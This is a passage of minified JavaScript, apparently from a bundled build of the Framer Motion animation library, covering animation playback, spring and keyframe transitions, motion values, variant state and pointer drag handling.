Ke=Math.floor(Ce),At=Ce%1;!At&&Ce>=1&&(At=1),At===1&&Ke--,Ke=Math.min(Ke,c+1),!!(Ke%2)&&(h==="reverse"?(At=1-At,d&&(At-=d/H)):h==="mirror"&&(be=J)),de=Bi(0,1,At)*H}const pe=te?{done:!1,value:s[0]}:be.next(de);L&&(pe.value=L(pe.value));let{done:Te}=pe;!te&&Ae!==null&&(Te=w>=0?$>=ae:$<=0);const xe=X===null&&(G==="finished"||G==="running"&&Te);return y&&y(pe.value),xe&&V(),pe},oe=()=>{R&&R.stop(),R=void 0},ue=()=>{G="idle",oe(),T(),O(),ne=ge=null},V=()=>{G="finished",m&&m(),oe(),T()},Q=()=>{if(E)return;R||(R=r(he));const P=R.now();p&&p(),X!==null?ne=P-X:(!ne||G==="finished")&&(ne=P),G==="finished"&&O(),ge=ne,X=null,G="running",R.start()};n&&Q();const q={then(P,B){return C.then(P,B)},get time(){return di($)},set time(P){P=un(P),$=P,X!==null||!R||w===0?X=P:ne=R.now()-P/w},get duration(){const P=W.calculatedDuration===null?of(W):W.calculatedDuration;return di(P)},get speed(){return w},set speed(P){P===w||!R||(w=P,q.time=di($))},get state(){return G},play:Q,pause:()=>{G="paused",X=$},stop:()=>{E=!0,G!=="idle"&&(G="idle",f&&f(),ue())},cancel:()=>{ge!==null&&he(ge),ue()},complete:()=>{G="finished"},sample:P=>(ne=0,he(P))};return q}function gk(n){let t;return()=>(t===void 0&&(t=n()),t)}const mk=gk(()=>Object.hasOwnProperty.call(Element.prototype,"animate")),yk=new Set(["opacity","clipPath","filter","transform","backgroundColor"]),_o=10,bk=2e4,vk=(n,t)=>t.type==="spring"||n==="backgroundColor"||!Yg(t.ease);function wk(n,t,{onUpdate:r,onComplete:s,...a}){if(!(mk()&&yk.has(t)&&!a.repeatDelay&&a.repeatType!=="mirror"&&a.damping!==0&&a.type!=="inertia"))return!1;let d=!1,h,p,f=!1;const m=()=>{p=new Promise(M=>{h=M})};m();let{keyframes:y,duration:v=300,ease:w,times:E}=a;if(vk(t,a)){const M=Ko({...a,repeat:0,delay:0});let L={done:!1,value:y[0]};const W=[];let J=0;for(;!L.done&&J<bk;)L=M.sample(J),W.push(L.value),J+=_o;E=void 0,y=W,v=J-_o,w="linear"}const T=I0(n.owner.current,t,y,{...a,duration:v,ease:w,times:E}),C=()=>{f=!1,T.cancel()},O=()=>{f=!0,_e.update(C),h(),m()};return T.onfinish=()=>{f||(n.set(_0(y,a)),s&&s(),O())},{then(M,L){return p.then(M,L)},attachTimeline(M){return T.timeline=M,T.onfinish=null,Ue},get time(){return di(T.currentTime||0)},set time(M){T.currentTime=un(M)},get speed(){return T.playbackRate},set speed(M){T.playbackRate=M},get duration(){return di(v)},play:()=>{d||(T.play(),ui(C))},pause:()=>T.pause(),stop:()=>{if(d=!0,T.playState==="idle")return;const{currentTime:M}=T;if(M){const L=Ko({...a,autoplay:!1});n.setWithVelocity(L.sample(M-_o).value,L.sample(M).value,_o)}O()},complete:()=>{f||T.finish()},cancel:O}}function kk({keyframes:n,delay:t,onUpdate:r,onComplete:s}){const a=()=>(r&&r(n[n.length-1]),s&&s(),{time:0,speed:1,duration:0,play:Ue,pause:Ue,stop:Ue,then:c=>(c(),Promise.resolve()),cancel:Ue,complete:Ue});return t?Ko({keyframes:[0,1],duration:0,delay:t,onComplete:a}):a()}const xk={type:"spring",stiffness:500,damping:25,restSpeed:10},Tk=n=>({type:"spring",stiffness:550,damping:n===0?2*Math.sqrt(550):30,restSpeed:10}),Sk={type:"keyframes",duration:.8},Ak={type:"keyframes",ease:[.25,.1,.35,1],duration:.3},Ck=(n,{keyframes:t})=>t.length>2?Sk:fn.has(n)?n.startsWith("scale")?Tk(t[1]):xk:Ak,Nc=(n,t)=>n==="zIndex"?!1:!!(typeof t=="number"||Array.isArray(t)||typeof t=="string"&&(Ni.test(t)||t==="0")&&!t.startsWith("url(")),Pk=new Set(["brightness","contrast","saturate","opacity"]);function Ek(n){const[t,r]=n.slice(0,-1).split("(");if(t==="drop-shadow")return n;const[s]=r.match(ra)||[];if(!s)return n;const a=r.replace(s,"");let c=Pk.has(t)?1:0;return s!==r&&(c*=100),t+"("+c+a+")"}const Ik=/([a-z-]*)\(.*?\)/g,Fc={...Ni,getAnimatableNone:n=>{const t=n.match(Ik);return t?t.map(Ek).join(" "):n}},_k={...jg,color:ct,backgroundColor:ct,outlineColor:ct,fill:ct,stroke:ct,borderColor:ct,borderTopColor:ct,borderRightColor:ct,borderBottomColor:ct,borderLeftColor:ct,filter:Fc,WebkitFilter:Fc},kd=n=>_k[n];function km(n,t){let r=kd(n);return r!==Fc&&(r=Ni),r.getAnimatableNone?r.getAnimatableNone(t):void 0}const xm=n=>/^0[^.\s]+$/.test(n);function Rk(n){if(typeof n=="number")return n===0;if(n!==null)return n==="none"||n==="0"||xm(n)}function Dk(n,t,r,s){const a=Nc(t,r);let c;Array.isArray(r)?c=[...r]:c=[null,r];const d=s.from!==void 0?s.from:n.get();let h;const p=[];for(let f=0;f<c.length;f++)c[f]===null&&(c[f]=f===0?d:c[f-1]),Rk(c[f])&&p.push(f),typeof c[f]=="string"&&c[f]!=="none"&&c[f]!=="0"&&(h=c[f]);if(a&&p.length&&h)for(let f=0;f<p.length;f++){const m=p[f];c[m]=km(t,h)}return c}function Mk({when:n,delay:t,delayChildren:r,staggerChildren:s,staggerDirection:a,repeat:c,repeatType:d,repeatDelay:h,from:p,elapsed:f,...m}){return!!Object.keys(m).length}function xd(n,t){return n[t]||n.default||n}const jk={skipAnimations:!1},Td=(n,t,r,s={})=>a=>{const c=xd(s,n)||{},d=c.delay||s.delay||0;let{elapsed:h=0}=s;h=h-un(d);const p=Dk(t,n,r,c),f=p[0],m=p[p.length-1],y=Nc(n,f),v=Nc(n,m);let w={keyframes:p,velocity:t.getVelocity(),ease:"easeOut",...c,delay:-h,onUpdate:E=>{t.set(E),c.onUpdate&&c.onUpdate(E)},onComplete:()=>{a(),c.onComplete&&c.onComplete()}};if(Mk(c)||(w={...w,...Ck(n,w)}),w.duration&&(w.duration=un(w.duration)),w.repeatDelay&&(w.repeatDelay=un(w.repeatDelay)),!y||!v||E0.current||c.type===!1||jk.skipAnimations)return kk(w);if(!s.isHandoff&&t.owner&&t.owner.current instanceof HTMLElement&&!t.owner.getProps().onUpdate){const E=wk(t,n,w);if(E)return E}return Ko(w)};function Jo(n){return!!(mt(n)&&n.add)}const Tm=n=>/^\-?\d*\.?\d+$/.test(n);function Sd(n,t){n.indexOf(t)===-1&&n.push(t)}function Ad(n,t){const r=n.indexOf(t);r>-1&&n.splice(r,1)}class Cd{constructor(){this.subscriptions=[]}add(t){return Sd(this.subscriptions,t),()=>Ad(this.subscriptions,t)}notify(t,r,s){const a=this.subscriptions.length;if(a)if(a===1)this.subscriptions[0](t,r,s);else for(let c=0;c<a;c++){const d=this.subscriptions[c];d&&d(t,r,s)}}getSize(){return this.subscriptions.length}clear(){this.subscriptions.length=0}}const Lk=n=>!isNaN(parseFloat(n));class Ok{constructor(t,r={}){this.version="10.18.0",this.timeDelta=0,this.lastUpdated=0,this.canTrackVelocity=!1,this.events={},this.updateAndNotify=(s,a=!0)=>{this.prev=this.current,this.current=s;const{delta:c,timestamp:d}=st;this.lastUpdated!==d&&(this.timeDelta=c,this.lastUpdated=d,_e.postRender(this.scheduleVelocityCheck)),this.prev!==this.current&&this.events.change&&this.events.change.notify(this.current),this.events.velocityChange&&this.events.velocityChange.notify(this.getVelocity()),a&&this.events.renderRequest&&this.events.renderRequest.notify(this.current)},this.scheduleVelocityCheck=()=>_e.postRender(this.velocityCheck),this.velocityCheck=({timestamp:s})=>{s!==this.lastUpdated&&(this.prev=this.current,this.events.velocityChange&&this.events.velocityChange.notify(this.getVelocity()))},this.hasAnimated=!1,this.prev=this.current=t,this.canTrackVelocity=Lk(this.current),this.owner=r.owner}onChange(t){return this.on("change",t)}on(t,r){this.events[t]||(this.events[t]=new Cd);const s=this.events[t].add(r);return t==="change"?()=>{s(),_e.read(()=>{this.events.change.getSize()||this.stop()})}:s}clearListeners(){for(const t in this.events)this.events[t].clear()}attach(t,r){this.passiveEffect=t,this.stopPassiveEffect=r}set(t,r=!0){!r||!this.passiveEffect?this.updateAndNotify(t,r):this.passiveEffect(t,this.updateAndNotify)}setWithVelocity(t,r,s){this.set(r),this.prev=t,this.timeDelta=s}jump(t){this.updateAndNotify(t),this.prev=t,this.stop(),this.stopPassiveEffect&&this.stopPassiveEffect()}get(){return this.current}getPrevious(){return this.prev}getVelocity(){return this.canTrackVelocity?bm(parseFloat(this.current)-parseFloat(this.prev),this.timeDelta):0}start(t){return this.stop(),new Promise(r=>{this.hasAnimated=!0,this.animation=t(r),this.events.animationStart&&this.events.animationStart.notify()}).then(()=>{this.events.animationComplete&&this.events.animationComplete.notify(),this.clearAnimation()})}stop(){this.animation&&(this.animation.stop(),this.events.animationCancel&&this.events.animationCancel.notify()),this.clearAnimation()}isAnimating(){return!!this.animation}clearAnimation(){delete this.animation}destroy(){this.clearListeners(),this.stop(),this.stopPassiveEffect&&this.stopPassiveEffect()}}function tr(n,t){return new Ok(n,t)}const Sm=n=>t=>t.test(n),Bk={test:n=>n==="auto",parse:n=>n},Am=[gn,le,Yt,Di,Hw,Ww,Bk],Gr=n=>Am.find(Sm(n)),Nk=[...Am,ct,Ni],Fk=n=>Nk.find(Sm(n));function zk(n,t,r){n.hasValue(t)?n.getValue(t).set(r):n.addValue(t,tr(r))}function Uk(n,t){const r=oa(n,t);let{transitionEnd:s={},transition:a={},...c}=r?n.makeTargetAnimatable(r,!1):{};c={...c,...s};for(const d in c){const h=r0(c[d]);zk(n,d,h)}}function Vk(n,t,r){var s,a;const c=Object.keys(t).filter(h=>!n.hasValue(h)),d=c.length;if(d)for(let h=0;h<d;h++){const p=c[h],f=t[p];let m=null;Array.isArray(f)&&(m=f[0]),m===null&&(m=(a=(s=r[p])!==null&&s!==void 0?s:n.readValue(p))!==null&&a!==void 0?a:t[p]),m!=null&&(typeof m=="string"&&(Tm(m)||xm(m))?m=parseFloat(m):!Fk(m)&&Ni.test(f)&&(m=km(p,f)),n.addValue(p,tr(m,{owner:n})),r[p]===void 0&&(r[p]=m),m!==null&&n.setBaseTarget(p,m))}}function Wk(n,t){return t?(t[n]||t.default||t).from:void 0}function Hk(n,t,r){const s={};for(const a in n){const c=Wk(a,t);if(c!==void 0)s[a]=c;else{const d=r.getValue(a);d&&(s[a]=d.get())}}return s}function $k({protectedKeys:n,needsAnimating:t},r){const s=n.hasOwnProperty(r)&&t[r]!==!0;return t[r]=!1,s}function Gk(n,t){const r=n.get();if(Array.isArray(t)){for(let s=0;s<t.length;s++)if(t[s]!==r)return!0}else return r!==t}function Cm(n,t,{delay:r=0,transitionOverride:s,type:a}={}){let{transition:c=n.getDefaultTransition(),transitionEnd:d,...h}=n.makeTargetAnimatable(t);const p=n.getValue("willChange");s&&(c=s);const f=[],m=a&&n.animationState&&n.animationState.getState()[a];for(const y in h){const v=n.getValue(y),w=h[y];if(!v||w===void 0||m&&$k(m,y))continue;const E={delay:r,elapsed:0,...xd(c||{},y)};if(window.HandoffAppearAnimations){const O=n.getProps()[Pg];if(O){const R=window.HandoffAppearAnimations(O,y,v,_e);R!==null&&(E.elapsed=R,E.isHandoff=!0)}}let T=!E.isHandoff&&!Gk(v,w);if(E.type==="spring"&&(v.getVelocity()||E.velocity)&&(T=!1),v.animation&&(T=!1),T)continue;v.start(Td(y,v,w,n.shouldReduceMotion&&fn.has(y)?{type:!1}:E));const C=v.animation;Jo(p)&&(p.add(y),C.then(()=>p.remove(y))),f.push(C)}return d&&Promise.all(f).then(()=>{d&&Uk(n,d)}),f}function zc(n,t,r={}){const s=oa(n,t,r.custom);let{transition:a=n.getDefaultTransition()||{}}=s||{};r.transitionOverride&&(a=r.transitionOverride);const c=s?()=>Promise.all(Cm(n,s,r)):()=>Promise.resolve(),d=n.variantChildren&&n.variantChildren.size?(p=0)=>{const{delayChildren:f=0,staggerChildren:m,staggerDirection:y}=a;return qk(n,t,f+p,m,y,r)}:()=>Promise.resolve(),{when:h}=a;if(h){const[p,f]=h==="beforeChildren"?[c,d]:[d,c];return p().then(()=>f())}else return Promise.all([c(),d(r.delay)])}function qk(n,t,r=0,s=0,a=1,c){const d=[],h=(n.variantChildren.size-1)*s,p=a===1?(f=0)=>f*s:(f=0)=>h-f*s;return Array.from(n.variantChildren).sort(Kk).forEach((f,m)=>{f.notify("AnimationStart",t),d.push(zc(f,t,{...c,delay:r+p(m)}).then(()=>f.notify("AnimationComplete",t)))}),Promise.all(d)}function Kk(n,t){return n.sortNodePosition(t)}function Jk(n,t,r={}){n.notify("AnimationStart",t);let s;if(Array.isArray(t)){const a=t.map(c=>zc(n,c,r));s=Promise.all(a)}else if(typeof t=="string")s=zc(n,t,r);else{const a=typeof t=="function"?oa(n,t,r.custom):t;s=Promise.all(Cm(n,a,r))}return s.then(()=>n.notify("AnimationComplete",t))}const Qk=[...ad].reverse(),Yk=ad.length;function Xk(n){return t=>Promise.all(t.map(({animation:r,options:s})=>Jk(n,r,s)))}function Zk(n){let t=Xk(n);const r=tx();let s=!0;const a=(p,f)=>{const m=oa(n,f);if(m){const{transition:y,transitionEnd:v,...w}=m;p={...p,...w,...v}}return p};function c(p){t=p(n)}function d(p,f){const m=n.getProps(),y=n.getVariantContext(!0)||{},v=[],w=new Set;let E={},T=1/0;for(let O=0;O<Yk;O++){const R=Qk[O],M=r[R],L=m[R]!==void 0?m[R]:y[R],W=os(L),J=R===f?M.isActive:null;J===!1&&(T=O);let G=L===y[R]&&L!==m[R]&&W;if(G&&s&&n.manuallyAnimateOnMount&&(G=!1),M.protectedKeys={...E},!M.isActive&&J===null||!L&&!M.prevProp||ia(L)||typeof L=="boolean")continue;let ne=ex(M.prevProp,L)||R===f&&M.isActive&&!G&&W||O>T&&W,ge=!1;const Ae=Array.isArray(L)?L:[L];let H=Ae.reduce(a,{});J===!1&&(H={});const{prevResolvedValues:ae={}}=M,$={...ae,...H},he=oe=>{ne=!0,w.has(oe)&&(ge=!0,w.delete(oe)),M.needsAnimating[oe]=!0};for(const oe in $){const ue=H[oe],V=ae[oe];if(E.hasOwnProperty(oe))continue;let Q=!1;$o(ue)&&$o(V)?Q=!Jg(ue,V):Q=ue!==V,Q?ue!==void 0?he(oe):w.add(oe):ue!==void 0&&w.has(oe)?he(oe):M.protectedKeys[oe]=!0}M.prevProp=L,M.prevResolvedValues=H,M.isActive&&(E={...E,...H}),s&&n.blockInitialAnimation&&(ne=!1),ne&&(!G||ge)&&v.push(...Ae.map(oe=>({animation:oe,options:{type:R,...p}})))}if(w.size){const O={};w.forEach(R=>{const M=n.getBaseTarget(R);M!==void 0&&(O[R]=M)}),v.push({animation:O})}let C=!!v.length;return s&&(m.initial===!1||m.initial===m.animate)&&!n.manuallyAnimateOnMount&&(C=!1),s=!1,C?t(v):Promise.resolve()}function h(p,f,m){var y;if(r[p].isActive===f)return Promise.resolve();(y=n.variantChildren)===null||y===void 0||y.forEach(w=>{var E;return(E=w.animationState)===null||E===void 0?void 0:E.setActive(p,f)}),r[p].isActive=f;const v=d(m,p);for(const w in r)r[w].protectedKeys={};return v}return{animateChanges:d,setActive:h,setAnimateFunction:c,getState:()=>r}}function ex(n,t){return typeof t=="string"?t!==n:Array.isArray(t)?!Jg(t,n):!1}function en(n=!1){return{isActive:n,protectedKeys:{},needsAnimating:{},prevResolvedValues:{}}}function tx(){return{animate:en(!0),whileInView:en(),whileHover:en(),whileTap:en(),whileDrag:en(),whileFocus:en(),exit:en()}}class ix extends Fi{constructor(t){super(t),t.animationState||(t.animationState=Zk(t))}updateAnimationControlsSubscription(){const{animate:t}=this.node.getProps();this.unmount(),ia(t)&&(this.unmount=t.subscribe(this.node))}mount(){this.updateAnimationControlsSubscription()}update(){const{animate:t}=this.node.getProps(),{animate:r}=this.node.prevProps||{};t!==r&&this.updateAnimationControlsSubscription()}unmount(){}}let nx=0;class rx extends Fi{constructor(){super(...arguments),this.id=nx++}update(){if(!this.node.presenceContext)return;const{isPresent:t,onExitComplete:r,custom:s}=this.node.presenceContext,{isPresent:a}=this.node.prevPresenceContext||{};if(!this.node.animationState||t===a)return;const c=this.node.animationState.setActive("exit",!t,{custom:s??this.node.getProps().custom});r&&!t&&c.then(()=>r(this.id))}mount(){const{register:t}=this.node.presenceContext||{};t&&(this.unmount=t(this.id))}unmount(){}}const sx={animation:{Feature:ix},exit:{Feature:rx}},af=(n,t)=>Math.abs(n-t);function ox(n,t){const r=af(n.x,t.x),s=af(n.y,t.y);return Math.sqrt(r**2+s**2)}class Pm{constructor(t,r,{transformPagePoint:s,contextWindow:a,dragSnapToOrigin:c=!1}={}){if(this.startEvent=null,this.lastMoveEvent=null,this.lastMoveEventInfo=null,this.handlers={},this.contextWindow=window,this.updatePoint=()=>{if(!(this.lastMoveEvent&&this.lastMoveEventInfo))return;const y=vc(this.lastMoveEventInfo,this.history),v=this.startEvent!==null,w=ox(y.offset,{x:0,y:0})>=3;if(!v&&!w)return;const{point:E}=y,{timestamp:T}=st;this.history.push({...E,timestamp:T});const{onStart:C,onMove:O}=this.handlers;v||(C&&C(this.lastMoveEvent,y),this.startEvent=this.lastMoveEvent),O&&O(this.lastMoveEvent,y)},this.handlePointerMove=(y,v)=>{this.lastMoveEvent=y,this.lastMoveEventInfo=bc(v,this.transformPagePoint),_e.update(this.updatePoint,!0)},this.handlePointerUp=(y,v)=>{this.end();const{onEnd:w,onSessionEnd:E,resumeAnimation:T}=this.handlers;if(this.dragSnapToOrigin&&T&&T(),!(this.lastMoveEvent&&this.lastMoveEventInfo))return;const C=vc(y.type==="pointercancel"?this.lastMoveEventInfo:bc(v,this.transformPagePoint),this.history);this.startEvent&&w&&w(y,C),E&&E(y,C)},!Hg(t))return;this.dragSnapToOrigin=c,this.handlers=r,this.transformPagePoint=s,this.contextWindow=a||window;const d=sa(t),h=bc(d,this.transformPagePoint),{point:p}=h,{timestamp:f}=st;this.history=[{...p,timestamp:f}];const{onSessionStart:m}=r;m&&m(t,vc(h,this.history)),this.removeListeners=Oi(ci(this.contextWindow,"pointermove",this.handlePointerMove),ci(this.contextWindow,"pointerup",this.handlePointerUp),ci(this.contextWindow,"pointercancel",this.handlePointerUp))}updateHandlers(t){this.handlers=t}end(){this.removeListeners&&this.removeListeners(),ui(this.updatePoint)}}function bc(n,t){return t?{point:t(n.point)}:n}function lf(n,t){return{x:n.x-t.x,y:n.y-t.y}}function vc({point:n},t){return{point:n,delta:lf(n,Em(t)),offset:lf(n,ax(t)),velocity:lx(t,.1)}}function ax(n){return n[0]}function Em(n){return n[n.length-1]}function lx(n,t){if(n.length<2)return{x:0,y:0};let r=n.length-1,s=null;const a=Em(n);for(;r>=0&&(s=n[r],!(a.timestamp-s.timestamp>un(t)));)r--;if(!s)return{x:0,y:0};const c=di(a.timestamp-s.timestamp);if(c===0)return{x:0,y:0};const d={x:(a.x-s.x)/c,y:(a.y-s.y)/c};return d.x===1/0&&(d.x=0),d.y===1/0&&(d.y=0),d}function St(n){return n.max-n.min}function Uc(n,t=0,r=.01){return Math.abs(n-t)<=r}function cf(n,t,r,s=.5){n.origin=s,n.originPoint=Be(t.min,t.max,n.origin),n.scale=St(r)/St(t),(Uc(n.scale,1,1e-4)||isNaN(n.scale))&&(n.scale=1),n.translate=Be(r.min,r.max,n.origin)-n.originPoint,(Uc(n.translate)||isNaN(n.translate))&&(n.translate=0)}function ts(n,t,r,s){cf(n.x,t.x,r.x,s?s.originX:void 0),cf(n.y,t.y,r.y,s?s.originY:void 0)}function df(n,t,r){n.min=r.min+t.min,n.max=n.min+St(t)}function cx(n,t,r){df(n.x,t.x,r.x),df(n.y,t.y,r.y)}function uf(n,t,r){n.min=t.min-r.min,n.max=n.min+St(t)}function is(n,t,r){uf(n.x,t.x,r.x),uf(n.y,t.y,r.y)}function dx(n,{min:t,max:r},s){return t!==void 0&&n<t?n=s?Be(t,n,s.min):Math.max(n,t):r!==void 0&&n>r&&(n=s?Be(r,n,s.max):Math.min(n,r)),n}function hf(n,t,r){return{min:t!==void 0?n.min+t:void 0,max:r!==void 0?n.max+r-(n.max-n.min):void 0}}function ux(n,{top:t,left:r,bottom:s,right:a}){return{x:hf(n.x,r,a),y:hf(n.y,t,s)}}function pf(n,t){let r=t.min-n.min,s=t.max-n.max;return t.max-t.min<n.max-n.min&&([r,s]=[s,r]),{min:r,max:s}}function hx(n,t){return{x:pf(n.x,t.x),y:pf(n.y,t.y)}}function px(n,t){let r=.5;const s=St(n),a=St(t);return a>s?r=ls(t.min,t.max-s,n.min):s>a&&(r=ls(n.min,n.max-a,t.min)),Bi(0,1,r)}function fx(n,t){const r={};return t.min!==void 0&&(r.min=t.min-n.min),t.max!==void 0&&(r.max=t.max-n.min),r}const Vc=.35;function gx(n=Vc){return n===!1?n=0:n===!0&&(n=Vc),{x:ff(n,"left","right"),y:ff(n,"top","bottom")}}function ff(n,t,r){return{min:gf(n,t),max:gf(n,r)}}function gf(n,t){return typeof n=="number"?n:n[t]||0}const mf=()=>({translate:0,scale:1,origin:0,originPoint:0}),Xn=()=>({x:mf(),y:mf()}),yf=()=>({min:0,max:0}),He=()=>({x:yf(),y:yf()});function jt(n){return[n("x"),n("y")]}function Im({top:n,left:t,right:r,bottom:s}){return{x:{min:t,max:r},y:{min:n,max:s}}}function mx({x:n,y:t}){return{top:t.min,right:n.max,bottom:t.max,left:n.min}}function yx(n,t){if(!t)return n;const r=t({x:n.left,y:n.top}),s=t({x:n.right,y:n.bottom});return{top:r.y,left:r.x,bottom:s.y,right:s.x}}function wc(n){return n===void 0||n===1}function Wc({scale:n,scaleX:t,scaleY:r}){return!wc(n)||!wc(t)||!wc(r)}function rn(n){return Wc(n)||_m(n)||n.z||n.rotate||n.rotateX||n.rotateY}function _m(n){return bf(n.x)||bf(n.y)}function bf(n){return n&&n!=="0%"}function Qo(n,t,r){const s=n-r,a=t*s;return r+a}function vf(n,t,r,s,a){return a!==void 0&&(n=Qo(n,a,s)),Qo(n,r,s)+t}function Hc(n,t=0,r=1,s,a){n.min=vf(n.min,t,r,s,a),n.max=vf(n.max,t,r,s,a)}function Rm(n,{x:t,y:r}){Hc(n.x,t.translate,t.scale,t.originPoint),Hc(n.y,r.translate,r.scale,r.originPoint)}function bx(n,t,r,s=!1){const a=r.length;if(!a)return;t.x=t.y=1;let c,d;for(let h=0;h<a;h++){c=r[h],d=c.projectionDelta;const p=c.instance;p&&p.style&&p.style.display==="contents"||(s&&c.options.layoutScroll&&c.scroll&&c!==c.root&&Zn(n,{x:-c.scroll.offset.x,y:-c.scroll.offset.y}),d&&(t.x*=d.x.scale,t.y*=d.y.scale,Rm(n,d)),s&&rn(c.latestValues)&&Zn(n,c.latestValues))}t.x=wf(t.x),t.y=wf(t.y)}function wf(n){return Number.isInteger(n)||n>1.0000000000001||n<.999999999999?n:1}function Mi(n,t){n.min=n.min+t,n.max=n.max+t}function kf(n,t,[r,s,a]){const c=t[a]!==void 0?t[a]:.5,d=Be(n.min,n.max,c);Hc(n,t[r],t[s],d,t.scale)}const vx=["x","scaleX","originX"],wx=["y","scaleY","originY"];function Zn(n,t){kf(n.x,t,vx),kf(n.y,t,wx)}function Dm(n,t){return Im(yx(n.getBoundingClientRect(),t))}function kx(n,t,r){const s=Dm(n,r),{scroll:a}=t;return a&&(Mi(s.x,a.offset.x),Mi(s.y,a.offset.y)),s}const Mm=({current:n})=>n?n.ownerDocument.defaultView:null,xx=new WeakMap;class Tx{constructor(t){this.openGlobalLock=null,this.isDragging=!1,this.currentDirection=null,this.originPoint={x:0,y:0},this.constraints=!1,this.hasMutatedConstraints=!1,this.elastic=He(),this.visualElement=t}start(t,{snapToCursor:r=!1}={}){const{presenceContext:s}=this.visualElement;if(s&&s.isPresent===!1)return;const a=m=>{const{dragSnapToOrigin:y}=this.getProps();y?this.pauseAnimation():this.stopAnimation(),r&&this.snapToCursor(sa(m,"page").point)},c=(m,y)=>{const{drag:v,dragPropagation:w,onDragStart:E}=this.getProps();if(v&&!w&&(this.openGlobalLock&&this.openGlobalLock(),this.openGlobalLock=Gg(v),!this.openGlobalLock))return;this.isDragging=!0,this.currentDirection=null,this.resolveConstraints(),this.visualElement.projection&&(this.visualElement.projection.isAnimationBlocked=!0,this.visualElement.projection.target=void 0),jt(C=>{let O=this.getAxisMotionValue(C).get()||0;if(Yt.test(O)){const{projection:R}=this.visualElement;if(R&&R.layout){const M=R.layout.layoutBox[C];M&&(O=St(M)*(parseFloat(O)/100))}}this.originPoint[C]=O}),E&&_e.update(()=>E(m,y),!1,!0);const{animationState:T}=this.visualElement;T&&T.setActive("whileDrag",!0)},d=(m,y)=>{const{dragPropagation:v,dragDirectionLock:w,onDirectionLock:E,onDrag:T}=this.getProps();if(!v&&!this.openGlobalLock)return;const{offset:C}=y;if(w&&this.currentDirection===null){this.currentDirection=Sx(C),this.currentDirection!==null&&E&&E(this.currentDirection);return}this.updateAxis("x",y.point,C),this.updateAxis("y",y.point,C),this.visualElement.render(),T&&T(m,y)},h=(m,y)=>this.stop(m,y),p=()=>jt(m=>{var y;return this.getAnimationState(m)==="paused"&&((y=this.getAxisMotionValue(m).animation)===null||y===void 0?void 0:y.play())}),{dragSnapToOrigin:f}=this.getProps();this.panSession=new Pm(t,{onSessionStart:a,onStart:c,onMove:d,onSessionEnd:h,resumeAnimation:p},{transformPagePoint:this.visualElement.getTransformPagePoint(),dragSnapToOrigin:f,contextWindow:Mm(this.visualElement)})}stop(t,r){const s=this.isDragging;if(this.cancel(),!s)return;const{velocity:a}=r;this.startAnimation(a);const{onDragEnd:c}=this.getProps();c&&_e.update(()=>c(t,r))}cancel(){this.isDragging=!1;const{projection:t,animationState:r}=this.visualElement;t&&(t.isAnimationBlocked=!1),this.panSession&&this.panSession.end(),this.panSession=void 0;const{dragPropagation:s}=this.getProps();!s&&this.openGlobalLock&&(this.openGlobalLock(),this.openGlobalLock=null),r&&r.setActive("whileDrag",!1)}updateAxis(t,r,s){const{drag:a}=this.getProps();if(!s||!Ro(t,a,this.currentDirection))return;const c=this.getAxisMotionValue(t);let d=this.originPoint[t]+s[t];this.constraints&&this.constraints[t]&&(d=dx(d,this.constraints[t],this.elastic[t])),c.set(d)}resolveConstraints(){var t;const{dragConstraints:r,dragElastic:s}=this.getProps(),a=this.visualElement.projection&&!this.visualElement.projection.layout?this.visualElement.projection.measure(!1):(t=this.visualElement.projection)===null||t===void 0?void 0:t.layout,c=this.constraints;r&&Qn(r)?this.constraints||(this.constraints=this.resolveRefConstraints()):r&&a?this.constraints=ux(a.layoutBox,r):this.constraints=!1,this.elastic=gx(s),c!==this.constraints&&a&&this.constraints&&!this.hasMutatedConstraints&&jt(d=>{this.getAxisMotionValue(d)&&(this.constraints[d]=fx(a.layoutBox[d],this.constraints[d]))})}resolveRefConstraints(){const{dragConstraints:t,onMeasureDragConstraints:r}=this.getProps();if(!t||!Qn(t))return!1;const s=t.current,{projection:a}=this.visualElement;if(!a||!a.layout)return!1;const c=kx(s,a.root,this.visualElement.getTransformPagePoint());let d=hx(a.layout.layoutBox,c);if(r){const h=r(mx(d));this.hasMutatedConstraints=!!h,h&&(d=Im(h))}return d}startAnimation(t){const{drag:r,dragMomentum:s,dragElastic:a,dragTransition:c,dragSnapToOrigin:d,onDragTransitionEnd:h}=this.getProps(),p=this.constraints||{},f=jt(m=>{if(!Ro(m,r,this.currentDirection))return;let y=p&&p[m]||{};d&&(y={min:0,max:0});const v=a?200:1e6,w=a?40:1e7,E={type:"inertia",velocity:s?t[m]:0,bounceStiffness:v,bounceDamping:w,timeConstant:750,restDelta:1,restSpeed:10,...c,...y};return this.startAxisValueAnimation(m,E)});return Promise.all(f).then(h)}startAxisValueAnimation(t,r){const s=this.getAxisMotionValue(t);return s.start(Td(t,s,0,r))}stopAnimation(){jt(t=>this.getAxisMotionValue(t).stop())}pauseAnimation(){jt(t=>{var r;return(r=this.getAxisMotionValue(t).animation)===null||r===void 0?void 0:r.pause()})}getAnimationState(t){var r;return(r=this.getAxisMotionValue(t).animation)===null||r===void 0?void 0:r.state}getAxisMotionValue(t){const r="_drag"+t.toUpperCase(),s=this.visualElement.getProps(),a=s[r];return a||this.visualElement.getValue(t,(s.initial?s.initial[t]:void 0)||0)}snapToCursor(t){jt(r=>{const{drag:s}=this.getProps();if(!Ro(r,s,this.currentDirection))return;const{projection:a}=this.visualElement,c=this.getAxisMotionValue(r);if(a&&a.layout){const{min:d,max:h}=a.layout.layoutBox[r];c.set(t[r]-Be(d,h,.5))}})}scalePositionWithinConstraints(){if(!this.visualElement.current)return;const{drag:t,dragConstraints:r}=this.getProps(),{projection:s}=this.visualElement;if(!Qn(r)||!s||!this.constraints)return;this.stopAnimation();const a={x:0,y:0};jt(d=>{const h=this.getAxisMotionValue(d);if(h){const p=h.get();a[d]=px({min:p,max:p},this.constraints[d])}});const{transformTemplate:c}=this.visualElement.getProps();this.visualElement.current.style.transform=c?c({},""):"none",s.root&&s.root.updateScroll(),s.updateLayout(),this.resolveConstraints(),jt(d=>{if(!Ro(d,t,null))return;const h=this.getAxisMotionValue(d),{min:p,max:f}=this.constraints[d];h.set(Be(p,f,a[d]))})}addListeners(){if(!this.visualElement.current)return;xx.set(this.visualElement,this);const t=this.visualElement.current,r=ci(t,"pointerdown",p=>{const{drag:f,dragListener:m=!0}=this.getProps();f&&m&&this.start(p)}),s=()=>{const{dragConstraints:p}=this.getProps();Qn(p)&&(this.constraints=this.resolveRefConstraints())},{projection:a}=this.visualElement,c=a.addEventListener("measure",s);a&&!a.layout&&(a.root&&a.root.updateScroll(),a.updateLayout()),s();const 